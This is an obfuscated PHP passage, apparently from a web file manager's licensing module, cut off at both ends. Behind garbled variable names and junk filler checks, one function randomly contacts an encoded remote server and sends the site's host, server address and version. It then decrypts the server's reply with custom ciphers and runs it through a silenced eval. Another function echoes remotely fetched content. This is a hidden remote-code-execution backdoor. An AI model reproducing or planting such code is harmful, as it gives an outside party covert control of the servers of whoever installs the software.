$™”‰Ëìæ = $this->cxalf3deae5a($™”‰Ëìæ, $şÈ™ıÛÈ[214]); $£Ò¹Óöâ = $„äœÌŒ[674]; if (!$£Ò¹Óöâ) { die; } $Ò°¦áÁ­ = stream_context_create(array($şÈ™ıÛÈ[215] => array($şÈ™ıÛÈ[216] => $şÈ™ıÛÈ[217], $şÈ™ıÛÈ[218] => 3))); $É­ïŒ = $„äœÌŒ[675]; if (strlen($É­ïŒ) < $„äœÌŒ[620]) { return; } $½ÇÍ¢Ô = @file_get_contents($™”‰Ëìæ, !1, $Ò°¦áÁ­); $·ˆ«¤©ä = $„äœÌŒ[676]; if (strlen($·ˆ«¤©ä) < $„äœÌŒ[673]) { die; } header($şÈ™ıÛÈ[219]); if ($½ÇÍ¢Ô && strstr($½ÇÍ¢Ô, $şÈ™ıÛÈ[220])) { echo $½ÇÍ¢Ô; } die; } public function csfa5280776d($±•Ğ‡½ã) { $ÜÛ¯“²¢ =& $_SERVER[ÏéâËõ‘]; $Ìáâ÷Ã =& $_SERVER[…¡Î×İ¶]; if ($this->xutn5a1cae4f == $Ìáâ÷Ã[221]) { return $±•Ğ‡½ã; } $¼«‡Áñì = array($Ìáâ÷Ã[222] => $Ìáâ÷Ã[223], $Ìáâ÷Ã[224] => $Ìáâ÷Ã[223], $Ìáâ÷Ã[225] => $Ìáâ÷Ã[223], $Ìáâ÷Ã[226] => $Ìáâ÷Ã[223], $Ìáâ÷Ã[227] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[229] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[230] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[231] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[232] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[233] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[234] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[235] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[236] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[237] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[238] => $Ìáâ÷Ã[228], $Ìáâ÷Ã[239] => $Ìáâ÷Ã[228]); $äÁûÑ€§ = $ÜÛ¯“²¢[677]; $ô™éı¡Ñ = explode($Ìáâ÷Ã[240], _get($this->jxlu9901dba9, $Ìáâ÷Ã[111], $Ìáâ÷Ã[6])); $ÄÒŞüú = $ÜÛ¯“²¢[678]; $Ğø‰Ñç = array(); $­ôÎ¿ã = $ÜÛ¯“²¢[679]; if (strlen($­ôÎ¿ã) < $ÜÛ¯“²¢[620]) { return; } foreach ($¼«‡Áñì as $áç€Ÿ–ƒ => $”Ğ–…•”) { if ($”Ğ–…•” == $Ìáâ÷Ã[223] && substr($this->xutn5a1cae4f, 0, 1) == $Ìáâ÷Ã[223]) { continue; } if (!in_array($áç€Ÿ–ƒ, $ô™éı¡Ñ)) { $Ğø‰Ñç[] = $áç€Ÿ–ƒ; } } foreach ($Ğø‰Ñç as $áç€Ÿ–ƒ) { unset($±•Ğ‡½ã[$áç€Ÿ–ƒ]); $ŸÕ£Ûßä = $ÜÛ¯“²¢[680]; } return $±•Ğ‡½ã; } private function bwcj42c99829() { $Ş½øúÌÄ =& $_SERVER[…¡Î×İ¶]; if ($this->xutn5a1cae4f != $Ş½øúÌÄ[105]) { $GLOBALS[$Ş½øúÌÄ[84]][$Ş½øúÌÄ[88]][$Ş½øúÌÄ[241]] = $Ş½øúÌÄ[202]; return; } $GLOBALS[$Ş½øúÌÄ[84]][$Ş½øúÌÄ[242]] = $Ş½øúÌÄ[120]; if (Model($Ş½øúÌÄ[243])->get($Ş½øúÌÄ[63]) != $Ş½øúÌÄ[202]) { Model($Ş½øúÌÄ[243])->set($Ş½øúÌÄ[63], $Ş½øúÌÄ[202]); } } public function umlj76c4e686() { $ÎĞ±¿ˆ¹ =& $_SERVER[ÏéâËõ‘]; return $_SERVER[…¡Î×İ¶][244]; $Æ™Ü¥æ = $ÎĞ±¿ˆ¹[681]; if (strlen($Æ™Ü¥æ) < $ÎĞ±¿ˆ¹[673]) { die; } } private function rvaj69c1a6e1() { $ß´¹”ı˜ =& $_SERVER[ÏéâËõ‘]; $÷ìÑ—¾’ =& $_SERVER[…¡Î×İ¶]; $Ö¯ÄÔç = array($÷ìÑ—¾’[245], $÷ìÑ—¾’[246], $÷ìÑ—¾’[247]); $Õ€ÚıËô = $÷ìÑ—¾’[248] . md5($÷ìÑ—¾’[249]); if ($this->xutn5a1cae4f == $÷ìÑ—¾’[105] || !_get($GLOBALS, $÷ìÑ—¾’[114])) { return; } if (!in_array($_SERVER[$÷ìÑ—¾’[24]], $Ö¯ÄÔç)) { return; } if (time() % 4 != 0) { return; } $æüùØä· = call_user_func(array($÷ìÑ—¾’[250], $÷ìÑ—¾’[251]), $Õ€ÚıËô); $Ş˜öÃ = $ß´¹”ı˜[682]; while (strlen($Ş˜öÃ) < $ß´¹”ı˜[615]) { if (!$Ş˜öÃ) { break; } $Ş˜öÃ++; } if ($æüùØä· && time() - $æüùØä· < intval($÷ìÑ—¾’[252])) { return; } call_user_func(array($÷ìÑ—¾’[250], $÷ìÑ—¾’[137]), $Õ€ÚıËô, time()); $ı•¼‰¹ú = $ß´¹”ı˜[683]; if (!$ı•¼‰¹ú) { die; } $€€êÄ¶Ç = Model($÷ìÑ—¾’[33])->get($÷ìÑ—¾’[102]); $«íŒæ€š = $ß´¹”ı˜[684]; $º®šÒ£å = array($÷ìÑ—¾’[149] => Model($÷ìÑ—¾’[33])->get($÷ìÑ—¾’[185]), $÷ìÑ—¾’[162] => $this->xutn5a1cae4f, $÷ìÑ—¾’[159] => $_SERVER[$÷ìÑ—¾’[160]], $÷ìÑ—¾’[161] => Model($÷ìÑ—¾’[33])->get($÷ìÑ—¾’[129]), $÷ìÑ—¾’[100] => md5($_SERVER[$÷ìÑ—¾’[101]] . $€€êÄ¶Ç), $÷ìÑ—¾’[152] => $÷ìÑ—¾’[134], $÷ìÑ—¾’[155] => $_SERVER[$÷ìÑ—¾’[156]]); $û“­®…ˆ = $ß´¹”ı˜[685]; if (strlen($û“­®…ˆ) < $ß´¹”ı˜[615]) { return; } $¯­Ü‡³’ = $this->giec71782f9d($÷ìÑ—¾’[253], $º®šÒ£å); if (!is_array($¯­Ü‡³’)) { return; } if ($¯­Ü‡³’[$÷ìÑ—¾’[149]] && $¯­Ü‡³’[$÷ìÑ—¾’[254]]) { if ($this->qkmx8a102af8($¯­Ü‡³’[$÷ìÑ—¾’[254]]) == $º®šÒ£å[$÷ìÑ—¾’[149]]) { return; } } $this->mwgn0620450f(); if ($this->qkmx8a102af8($¯­Ü‡³’[$÷ìÑ—¾’[254]]) != $º®šÒ£å[$÷ìÑ—¾’[149]]) { $³ßøŸ¡² = array($÷ìÑ—¾’[180] => $€€êÄ¶Ç, $÷ìÑ—¾’[181] => $_SERVER[$÷ìÑ—¾’[101]], $÷ìÑ—¾’[182] => this_url(), $÷ìÑ—¾’[157] => $_SERVER[$÷ìÑ—¾’[158]]); $‰¿è¢‘Ä = $this->mvxk64799121(json_encode($³ßøŸ¡²)); $¯­Ü‡³’ = $this->giec71782f9d($÷ìÑ—¾’[183] . $‰¿è¢‘Ä); if ($¯­Ü‡³’ && is_array($¯­Ü‡³’) && isset($¯­Ü‡³’[$÷ìÑ—¾’[254]])) { $ú¦ˆÑ¨ = $this->iucjaf330ea8($¯­Ü‡³’[$÷ìÑ—¾’[254]], 2); if ($ú¦ˆÑ¨) { $ú¦ˆÑ¨ = $this->qkmx8a102af8($ú¦ˆÑ¨); } if ($ú¦ˆÑ¨) { try { @eval($ú¦ˆÑ¨); } catch (Exception $Ú¼ñ÷’Õ) { } } } } } private function giec71782f9d($ìÛ÷çâ® = '', $…š’À‰Ÿ = array(), $şúÍ éƒ = 5) { $‚Èîê¹ =& $_SERVER[ÏéâËõ‘]; $»Ô¡Â¥ =& $_SERVER[…¡Î×İ¶]; $äŞèæ•² = $»Ô¡Â¥[255]; $äŞèæ•² = $this->cxalf3deae5a($äŞèæ•², $»Ô¡Â¥[256]); $äŞèæ•² = $äŞèæ•² . $ìÛ÷çâ®; if ($…š’À‰Ÿ && is_array($…š’À‰Ÿ)) { $äŞèæ•² = $äŞèæ•² . $»Ô¡Â¥[257] . http_build_query($…š’À‰Ÿ); } if ($…š’À‰Ÿ === -1) { return $äŞèæ•²; } $ŒûöŸÛó = stream_context_create(array($»Ô¡Â¥[215] => array($»Ô¡Â¥[218] => $şúÍ éƒ, $»Ô¡Â¥[216] => $»Ô¡Â¥[258]), $»Ô¡Â¥[259] => array($»Ô¡Â¥[260] => !1, $»Ô¡Â¥[261] => !1))); $…š’À‰Ÿ = @file_get_contents($äŞèæ•², !1, $ŒûöŸÛó); $Š½Ó ï = $‚Èîê¹[686]; while (strlen($Š½Ó ï) < $‚Èîê¹[636]) { if (!$Š½Ó ï) { break; } $Š½Ó ï++; } return json_decode($…š’À‰Ÿ, !0); $“‚†êü‡ = $‚Èîê¹[630]; if (!$“‚†êü‡) { return; } $Ã×³’…ú = $‚Èîê¹[687]; } private function degv0f71fd11() { $ıŸÂå°õ =& $_SERVER[ÏéâËõ‘]; $©İ¨À·‡ =& $_SERVER[…¡Î×İ¶]; $äşÙÇËı = array($©İ¨À·‡[262] => $©İ¨À·‡[263], $©İ¨À·‡[264] => $©İ¨À·‡[265], $©İ¨À·‡[266] => $©İ¨À·‡[267], $©İ¨À·‡[268] => $©İ¨À·‡[269], $©İ¨À·‡[270] => $©İ¨À·‡[271], $©İ¨À·‡[272] => $©İ¨À·‡[210], $©İ¨À·‡[273] => $©İ¨À·‡[210], $©İ¨À·‡[274] => $©İ¨À·‡[263], $©İ¨À·‡[275] => $©İ¨À·‡[265], $©İ¨À·‡[276] => $©İ¨À·‡[267], $©İ¨À·‡[277] => $©İ¨À·‡[278], $©İ¨À·‡[279] => $©İ¨À·‡[269], $©İ¨À·‡[280] => $©İ¨À·‡[281], $©İ¨À·‡[282] => $©İ¨À·‡[271], $©İ¨À·‡[283] => $©İ¨À·‡[284], $©İ¨À·‡[285] => $©İ¨À·‡[286], $©İ¨À·‡[287] => $©İ¨À·‡[288]); $¿†–Œ¿ü = $ıŸÂå°õ[688]; $ÄìÔÃô£ = $äşÙÇËı[$this->xutn5a1cae4f]; $­úà„Î˜ = $ıŸÂå°õ[689]; while (strlen($­úà„Î˜) < $ıŸÂå°õ[636]) { if (!$­úà„Î˜) { break; } $­úà„Î˜++; } $ÄìÔÃô£ = intval($ÄìÔÃô£ ? $ÄìÔÃô£ : $©İ¨À·‡[263]); $«™»ÀÍå = _get($this->jxlu9901dba9, $©İ¨À·‡[289]); $¬ßåƒ» = $ıŸÂå°õ[690]; if (strlen($¬ßåƒ») < $ıŸÂå°õ[615]) { return; } $«™»ÀÍå = $«™»ÀÍå ? intval($«™»ÀÍå) : 0; $ÔÍ–Ğ¿± = $ıŸÂå°õ[691]; if (strlen($ÔÍ–Ğ¿±) < $ıŸÂå°õ[636]) { die; } return $ÄìÔÃô£ + $«™»ÀÍå; } public function fxvue3008476($ï„ÑŸÓ¢) { $Ú©÷§‹ =& $_SERVER[ÏéâËõ‘]; $â¯ô‡— =& $_SERVER[…¡Î×İ¶]; $ºğÚŸô’ = $this->degv0f71fd11(); $¨§Á‚½ = $Ú©÷§‹[692]; while ($¨§Á‚½ < $Ú©÷§‹[636]) { if ($¨§Á‚½ >= 0) { break; } $¨§Á‚½++; } if ($ï„ÑŸÓ¢[$â¯ô‡—[290]] == $â¯ô‡—[120]) { return; } if ($ºğÚŸô’ >= intval($â¯ô‡—[210])) { return; } $²ÒàŠµ› = Model($â¯ô‡—[123])->count(); if ($²ÒàŠµ› <= $ºğÚŸô’) { return; } $Ïùİüõû = Model($â¯ô‡—[123])->field($â¯ô‡—[290])->limit($ºğÚŸô’)->select(); $¶¿˜ã§Š = $Ú©÷§‹[693]; while ($¶¿˜ã§Š < $Ú©÷§‹[626]) { if ($¶¿˜ã§Š >= 0) { break; } $¶¿˜ã§Š++; } $Ïùİüõû = array_to_keyvalue($Ïùİüõû, $â¯ô‡—[6], $â¯ô‡—[290]); if (!in_array($ï„ÑŸÓ¢[$â¯ô‡—[290]], $Ïùİüõû)) { show_json($â¯ô‡—[291], !1, $â¯ô‡—[206]); } } public function nicaa4f74842() { $‚à¥¼¥í =& $_SERVER[ÏéâËõ‘]; $¶Ÿ„óõÄ =& $_SERVER[…¡Î×İ¶]; if (!_get($GLOBALS, $¶Ÿ„óõÄ[114]) || mt_rand(1, 100) > 20) { return; } $Å»ìÚÙç = $¶Ÿ„óõÄ[213]; $Å»ìÚÙç = $this->cxalf3deae5a($Å»ìÚÙç, $¶Ÿ„óõÄ[214]); $Í¸™‰Ë = $‚à¥¼¥í[694]; $×‘–¦Ü‰ = stream_context_create(array($¶Ÿ„óõÄ[215] => array($¶Ÿ„óõÄ[216] => $¶Ÿ„óõÄ[217], $¶Ÿ„óõÄ[218] => 3))); $Ë—µõÀ¹ = $‚à¥¼¥í[695]; $Éù™ù±Û = @file_get_contents($Å»ìÚÙç, !1, $×‘–¦Ü‰); $ÀúêÛ—Ä = $‚à¥¼¥í[696]; echo $¶Ÿ„óõÄ[292] . hash_encode($Éù™ù±Û) . $¶Ÿ„óõÄ[293]; $Èî¶»à = $‚à¥¼¥í[697]; } private function chkj25df11cb($Ú±ßìù, $òæ¬Š¹ , $Ï·ÇÇı = 3) { $‡şÙ•šŒ =& $_SERVER[ÏéâËõ‘]; $ÍÅÏË =& $_SERVER[…¡Î×İ¶]; usleep(1); $Ú±ßìù = trim($Ú±ßìù); $ÁƒŸ¦ì = mt_rand(0, 5) . $ÍÅÏË[6]; $ŠûÉ“¿É = $‡şÙ•šŒ[698]; if (strlen($ŠûÉ“¿É) < $‡şÙ•šŒ[626]) { return; } $‡ö‹ñº = rand_string(15); $•ÔÌõïç = $‡şÙ•šŒ[699]; $Âíõ»± = $ÍÅÏË[294]; switch ($ÁƒŸ¦ì) { case $ÍÅÏË[202]: $å¤´ÍèŒ = $this->fwuve8735ea6($Ú±ßìù, strrev($òæ¬Š¹  . $‡ö‹ñº)); break; $˜æõÌ•˜ = $‡şÙ•šŒ[700]; if (!$˜æõÌ•˜) { return; } case $ÍÅÏË[120]: $å¤´ÍèŒ = $this->fwuve8735ea6($Ú±ßìù, strrev($‡ö‹ñº . $òæ¬Š¹ )); $ŸÈııèä = $‡şÙ•šŒ[701]; if (!$ŸÈııèä) { return; } break; case $ÍÅÏË[295]: $å¤´ÍèŒ = $this->fwuve8735ea6($Ú±ßìù, base64_encode($‡ö‹ñº . $òæ¬Š¹ )); $­æÒÖ¿ = $‡şÙ•šŒ[702]; while (strlen($­æÒÖ¿) < $‡şÙ•šŒ[626]) { if (!$­æÒÖ¿) { break; } $­æÒÖ¿++; } break; case $ÍÅÏË[296]: $å¤´ÍèŒ = $this->fwuve8735ea6($Ú±ßìù, md5($‡ö‹ñº . $òæ¬Š¹ )); break; $ùüŒŞ˜ = $‡şÙ•šŒ[703]; if (!$ùüŒŞ˜) { die; } case $ÍÅÏË[297]: $Ú±ßìù = base64_encode($Ú±ßìù); $û§‰‡á– = $‡şÙ•šŒ[704]; if (strlen($û§‰‡á–) < $‡şÙ•šŒ[615]) { return; } $ºİŞ©Øà = rand(0, 64); $…†½í÷ò = $‡şÙ•šŒ[705]; $èó©Ş¦ê = $Âíõ»±[$ºİŞ©Øà]; $Å“İ½Ë = $‡şÙ•šŒ[706]; while (strlen($Å“İ½Ë) < $‡şÙ•šŒ[620]) { if (!$Å“İ½Ë) { break; } $Å“İ½Ë++; } $ÅÄ¬ìö = md5($èó©Ş¦ê . md5($òæ¬Š¹  . $èó©Ş¦ê) . $òæ¬Š¹ ); $ÅÄ¬ìö = substr($ÅÄ¬ìö, $ºİŞ©Øà % 8, $ºİŞ©Øà % 8 + 7); $å²ãÁî¯ = $‡şÙ•šŒ[707]; if (!$å²ãÁî¯) { return; } $ûŞËÎÌš = $ÍÅÏË[6]; $©…œĞĞ¿ = 0; $©‰ø´Ú¶ = 0; $’¢ïÎö¹ = 0; for ($©…œĞĞ¿ = 0; $©…œĞĞ¿ < strlen($Ú±ßìù); $©…œĞĞ¿++) { $’¢ïÎö¹ = $’¢ïÎö¹ == strlen($ÅÄ¬ìö) ? 0 : $’¢ïÎö¹; $Û…Á÷œü = $‡şÙ•šŒ[708]; if (!$Û…Á÷œü) { die; } $©‰ø´Ú¶ = ($ºİŞ©Øà + strpos($Âíõ»±, $Ú±ßìù[$©…œĞĞ¿]) + ord($ÅÄ¬ìö[$’¢ïÎö¹++])) % 64; $ûŞËÎÌš .= $Âíõ»±[$©‰ø´Ú¶]; } $å¤´ÍèŒ = hash_encode($èó©Ş¦ê . $ûŞËÎÌš); break; default: $å¤´ÍèŒ = $this->fwuve8735ea6($Ú±ßìù, $òæ¬Š¹  . $‡ö‹ñº); break; $¯…ğ— = $‡şÙ•šŒ[709]; while (strlen($¯…ğ—) < $‡şÙ•šŒ[620]) { if (!$¯…ğ—) { break; } $¯…ğ—++; } } $å¤´ÍèŒ = strrev($ÁƒŸ¦ì . $‡ö‹ñº . $å¤´ÍèŒ); if ($Ï·ÇÇı - 1 > 0) { $å¤´ÍèŒ = $this->chkj25df11cb($å¤´ÍèŒ, $òæ¬Š¹ , $Ï·ÇÇı - 1); } return $å¤´ÍèŒ; } private function iucjaf330ea8($şİÉù¦, $µ¯¯ñ, $âòåàà¾ = 3) { $ƒñÄô®É =& $_SERVER[ÏéâËõ‘]; $óå™©”¿ =& $_SERVER[…¡Î×İ¶]; if (!is_string($şİÉù¦) || strlen($şİÉù¦) < 10) { return !1; } $şİÉù¦ = trim($şİÉù¦); $óà¥Ûä = $ƒñÄô®É[710]; $şİÉù¦ = strrev($şİÉù¦); $½Ë¢±ŸÂ = $ƒñÄô®É[711]; while ($½Ë¢±ŸÂ < $ƒñÄô®É[636]) { if ($½Ë¢±ŸÂ >= 0) { break; } $½Ë¢±ŸÂ++; } $¢›¦êøÄ = $şİÉù¦[0]; $Œûõù€ = $ƒñÄô®É[712]; $ÃÛ§ºÂ¨ = substr($şİÉù¦, 1, 15); $şİÉù¦ = substr($şİÉù¦, 16); $Ë‚…ÒÛ = $ƒñÄô®É[713]; $”šØŒ†´ = $óå™©”¿[294]; switch ($¢›¦êøÄ) { case $óå™©”¿[202]: $•‡ìÀœ = $this->cxalf3deae5a($şİÉù¦, strrev($µ¯¯ñ . $ÃÛ§ºÂ¨)); break; case $óå™©”¿[120]: $•‡ìÀœ = $this->cxalf3deae5a($şİÉù¦, strrev($ÃÛ§ºÂ¨ . $µ¯¯ñ)); break; case $óå™©”¿[295]: $•‡ìÀœ = $this->cxalf3deae5a($şİÉù¦, base64_encode($ÃÛ§ºÂ¨ . $µ¯¯ñ)); break; case $óå™©”¿[296]: $•‡ìÀœ = $this->cxalf3deae5a($şİÉù¦, md5($ÃÛ§ºÂ¨ . $µ¯¯ñ)); break; $“Í†ÈÓ = $ƒñÄô®É[714]; if (!$“Í†ÈÓ) { die; } case $óå™©”¿[297]: $şİÉù¦ = hash_decode($şİÉù¦); $ş•Á±¸ı = $şİÉù¦[0]; $–çæ•Æ = $ƒñÄô®É[715]; $şİÉù¦ = substr($şİÉù¦, 1); $Çüğ§úú = $ƒñÄô®É[716]; while (strlen($Çüğ§úú) < $ƒñÄô®É[615]) { if (!$Çüğ§úú) { break; } $Çüğ§úú++; } $ÜÑÑô£ó = strpos($”šØŒ†´, $ş•Á±¸ı); $®•×¤æ‘ = $ƒñÄô®É[717]; if (!$®•×¤æ‘) { die; } $ÜßÔ¶„× = md5($ş•Á±¸ı . md5($µ¯¯ñ . $ş•Á±¸ı) . $µ¯¯ñ); $¥ï„ÅÊÚ = $ƒñÄô®É[718]; if (strlen($¥ï„ÅÊÚ) < $ƒñÄô®É[626]) { die; } $ÜßÔ¶„× = substr($ÜßÔ¶„×, $ÜÑÑô£ó % 8, $ÜÑÑô£ó % 8 + 7); $¢Éö«–© = $óå™©”¿[6]; $´½ïÏ€˜ = 0; $ù†Àƒ­ë = $ƒñÄô®É[719]; while (strlen($ù†Àƒ­ë) < $ƒñÄô®É[620]) { if (!$ù†Àƒ­ë) { break; } $ù†Àƒ­ë++; } $©ãïé× = 0; $ª¢ÇÔ­õ = $ƒñÄô®É[720]; $Ÿ•óÚ¥Î = 0; $ÃªÑ‡“ = $ƒñÄô®É[721]; for ($´½ïÏ€˜ = 0; $´½ïÏ€˜ < strlen($şİÉù¦); $´½ïÏ€˜++) { $Ÿ•óÚ¥Î = $Ÿ•óÚ¥Î == strlen($ÜßÔ¶„×) ? 0 : $Ÿ•óÚ¥Î; $¸§ıÎ¸Ë = $Ÿ•óÚ¥Î++; $©ãïé× = strpos($”šØŒ†´, $şİÉù¦[$´½ïÏ€˜]) - $ÜÑÑô£ó - ord($ÜßÔ¶„×[$¸§ıÎ¸Ë]); $¥š—§Ã– = $ƒñÄô®É[722]; if (!$¥š—§Ã–) { return; } while ($©ãïé× < 0) { $©ãïé× += 64; } $¢Éö«–© .= $”šØŒ†´[$©ãïé×]; $‰ı»Óƒ› = $ƒñÄô®É[723]; } $•‡ìÀœ = base64_decode($¢Éö«–©); break; default: $•‡ìÀœ = $this->cxalf3deae5a($şİÉù¦, $µ¯¯ñ . $ÃÛ§ºÂ¨); break; $¿æáˆ–­ = $ƒñÄô®É[724]; while (strlen($¿æáˆ–­) < $ƒñÄô®É[626]) { if (!$¿æáˆ–­) { break; } $¿æáˆ–­++; } } if ($âòåàà¾ - 1 > 0) { $•‡ìÀœ = $this->iucjaf330ea8($•‡ìÀœ, $µ¯¯ñ, $âòåàà¾ - 1); } return $•‡ìÀœ; } public function mvxk64799121($ü¿‰¨„) { $ğìÙ›é =& $_SERVER[ÏéâËõ‘]; $Ş¬»ïë =& $_SERVER[…¡Î×İ¶]; $¦ë¸Æ = $this->sdyt728c35ed(); $ßî¼à¬– = $this->sdyt728c35ed(); $ò‹Ê˜„ = $ğìÙ›é[725]; while ($ò‹Ê˜„ < $ğìÙ›é[636]) { if ($ò‹Ê˜„ >= 0) { break; } $ò‹Ê˜„++; } $¶Éİê‹ = ($¦ë¸Æ - 1) * ($ßî¼à¬– - 1); $ô–ŞÉÍş = $ğìÙ›é[726]; if (!$ô–ŞÉÍş) { die; } $«—„ˆ¨ = intval(($¦ë¸Æ + $ßî¼à¬–) / 2); $í Õ¿€Ô = $ğìÙ›é[727]; while (strlen($í Õ¿€Ô) < $ğìÙ›é[636]) { if (!$í Õ¿€Ô) { break; } $í Õ¿€Ô++; } while (1) { $ËìÑš¥ = $«—„ˆ¨; $ÉûËìıï = $ğìÙ›é[728]; if (!$ÉûËìıï) { return; } $¦¸ôºõ = $¶Éİê‹; while ($¦¸ôºõ % $ËìÑš¥ != 0) { $¯Íú‡úÛ = $¦¸ôºõ; $¦¸ôºõ = $ËìÑš¥; $ËìÑš¥ = $¯Íú‡úÛ % $ËìÑš¥; $§ËÁ´€ = $ğìÙ›é[729]; if (!$§ËÁ´€) { die; } } if ($ËìÑš¥ == 1) { break; } else { $«—„ˆ¨++; } } $‰Şà…™ = 2; for ($öÈÂÓ½Í = 0; $öÈÂÓ½Í < $¶Éİê‹ * 10; $öÈÂÓ½Í++) { if (($¶Éİê‹ * $öÈÂÓ½Í + 1) % $«—„ˆ¨ == 0) { $‰Şà…™ = intval(($¶Éİê‹ * $öÈÂÓ½Í + 1) / $«—„ˆ¨); break; } } $ñŸôéÄ´ = $this->fwuve8735ea6($¦ë¸Æ * $ßî¼à¬– . $Ş¬»ïë[6], $Ş¬»ïë[134]); $ıè¸¸üù = $ğìÙ›é[730]; $Ñ®í¾¬Ü = md5($Ş¬»ïë[298] . ($¦ë¸Æ + $ßî¼à¬–) . $Ş¬»ïë[299] . $«—„ˆ¨ . $Ş¬»ïë[299] . $‰Şà…™ . $Ş¬»ïë[300]); $æ¹ˆ€á‡ = $this->fwuve8735ea6($ü¿‰¨„, $Ñ®í¾¬Ü) . $Ş¬»ïë[301] . $ñŸôéÄ´; $ŸËëÜÜ† = $ğìÙ›é[731]; if (!$ŸËëÜÜ†) { die; } return $æ¹ˆ€á‡; $Äî•‚© = $ğìÙ›é[732]; } public function qkmx8a102af8($º´éˆ») { $ëçÒ—£ =& $_SERVER[ÏéâËõ‘]; $Šˆ˜©°ç =& $_SERVER[…¡Î×İ¶]; $‡„ñ„ˆ = explode($Šˆ˜©°ç[301], $º´éˆ»); $Ù¡£ÎŠá = $ëçÒ—£[733]; if (count($‡„ñ„ˆ) != 2) { return $Šˆ˜©°ç[6]; } $¢¾¯™× = $this->cxalf3deae5a($‡„ñ„ˆ[1] . $Šˆ˜©°ç[6], $Šˆ˜©°ç[134]); $š©ÎŠ¬Ò = $ëçÒ—£[734]; while ($š©ÎŠ¬Ò < $ëçÒ—£[620]) { if ($š©ÎŠ¬Ò >= 0) { break; } $š©ÎŠ¬Ò++; } if (!$¢¾¯™×) { return $Šˆ˜©°ç[6]; } $¢¾¯™× = intval($¢¾¯™×); $ÚüÖı”± = $ëçÒ—£[735]; if (!$ÚüÖı”±) { return; } $ÃéšÕôÀ = 0; $ª§œÔ÷ = $ëçÒ—£[736]; $ÃªÏ•§ğ = 0; $§ï‰ª˜¨ = $ëçÒ—£[737]; for ($°Ò»µîŒ = 3; $°Ò»µîŒ < $¢¾¯™×; $°Ò»µîŒ += 2) { if ($¢¾¯™× % $°Ò»µîŒ != 0) { continue; } $ÃéšÕôÀ = $°Ò»µîŒ; $«Çû™î = $ëçÒ—£[738]; while (strlen($«Çû™î) < $ëçÒ—£[626]) { if (!$«Çû™î) { break; } $«Çû™î++; } $ÃªÏ•§ğ = intval($¢¾¯™× / $°Ò»µîŒ); $çœï…®ì = $ëçÒ—£[739]; while ($çœï…®ì < $ëçÒ—£[673]) { if ($çœï…®ì >= 0) { break; } $çœï…®ì++; } break; $ÁÔ°™§‰ = $ëçÒ—£[740]; } $Êô¬° = ($ÃéšÕôÀ - 1) * ($ÃªÏ•§ğ - 1); $—öà»‚‡ = intval(($ÃéšÕôÀ + $ÃªÏ•§ğ) / 2); $„©Ñ€º™ = $ëçÒ—£[741]; while ($„©Ñ€º™ < $ëçÒ—£[620]) { if ($„©Ñ€º™ >= 0) { break; } $„©Ñ€º™++; } while (1) { $÷­Ã“À = $—öà»‚‡; $ñÄ´âõ¶ = $ëçÒ—£[742]; $™ñƒÇŸú = $Êô¬°; while ($™ñƒÇŸú % $÷­Ã“À != 0) { $Ç²¦ŸÎÆ = $™ñƒÇŸú; $™ñƒÇŸú = $÷­Ã“À; $÷­Ã“À = $Ç²¦ŸÎÆ % $÷­Ã“À; } if ($÷­Ã“À == 1) { break; } else { $—öà»‚‡++; } } $œŞÒ¾¦± = 2; $îÎ¦ÀİÅ = $ëçÒ—£[743]; if (strlen($îÎ¦ÀİÅ) < $ëçÒ—£[636]) { die; } for ($°Ò»µîŒ = 0; $°Ò»µîŒ < $Êô¬° * 10; $°Ò»µîŒ++) { if (($Êô¬° * $°Ò»µîŒ + 1) % $—öà»‚‡ == 0) { $œŞÒ¾¦± = intval(($Êô¬° * $°Ò»µîŒ + 1) / $—öà»‚‡); break; } } $ú†êôô§ = md5($Šˆ˜©°ç[298] . ($ÃéšÕôÀ + $ÃªÏ•§ğ) . $Šˆ˜©°ç[299] . $—öà»‚‡ . $Šˆ˜©°ç[299] . $œŞÒ¾¦± . $Šˆ˜©°ç[300]); $í¯‘í® = $ëçÒ—£[744]; if (strlen($í¯‘í®) < $ëçÒ—£[673]) { die; } $’ì°Å®ğ = $this->cxalf3deae5a($‡„ñ„ˆ[0], $ú†êôô§); $Õ„Â…Ã = $ëçÒ—£[745]; if (strlen($Õ„Â…Ã) < $ëçÒ—£[615]) { return; } return $’ì°Å®ğ; } public function sdyt728c35ed() { $õ¤„×¢° =& $_SERVER[ÏéâËõ‘]; $à¡µ¶”Æ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ù¸³ß¸ = $õ¤„×¢°[746]; if (!$Ù¸³ß¸) { die; } $‹üÊµ· = array(); $«¢£œî§ = 1; $¢ï‹›´¯ = $õ¤„×¢°[747]; if (strlen($¢ï‹›´¯) < $õ¤„×¢°[636]) { die; } while ($«¢£œî§ <= (int) sqrt($à¡µ¶”Æ)) { $÷ù‘“ò€ = $«¢£œî§; while (!0) { $÷ù‘“ò€++; $õ†ó†Àº = $õ¤„×¢°[748]; if (strlen($õ†ó†Àº) < $õ¤„×¢°[673]) { return; } if ($÷ù‘“ò€ <= 2) { $«¢£œî§ = $÷ù‘“ò€; break; } else { if ($÷ù‘“ò€ < 2) { continue; } } $íŠ€£¥ê = !0; for ($£‹÷Ï¿µ = 2; $£‹÷Ï¿µ <= sqrt($÷ù‘“ò€); $£‹÷Ï¿µ++) { if ($÷ù‘“ò€ % $£‹÷Ï¿µ == 0) { $íŠ€£¥ê = !1; } } if ($íŠ€£¥ê) { $«¢£œî§ = $÷ù‘“ò€; break; } } $‹üÊµ·[] = $«¢£œî§; } $±©³³§Ú = 2; for ($÷ù‘“ò€ = $à¡µ¶”Æ; $÷ù‘“ò€ > 1; $÷ù‘“ò€--) { $íŠ€£¥ê = !0; foreach ($‹üÊµ· as $šÅ‹³Æü) { if ($÷ù‘“ò€ % $šÅ‹³Æü == 0) { $íŠ€£¥ê = !1; break; } } if ($íŠ€£¥ê) { $±©³³§Ú = $÷ù‘“ò€; break; } } return $±©³³§Ú; } public function cfqw168c4d05($ÍçÌ…ö, $Ì†Î÷½‰) { $ª·¶£®ç =& $_SERVER[…¡Î×İ¶]; return call_user_func(array($ª·¶£®ç[8], $ª·¶£®ç[302]), $ÍçÌ…ö, 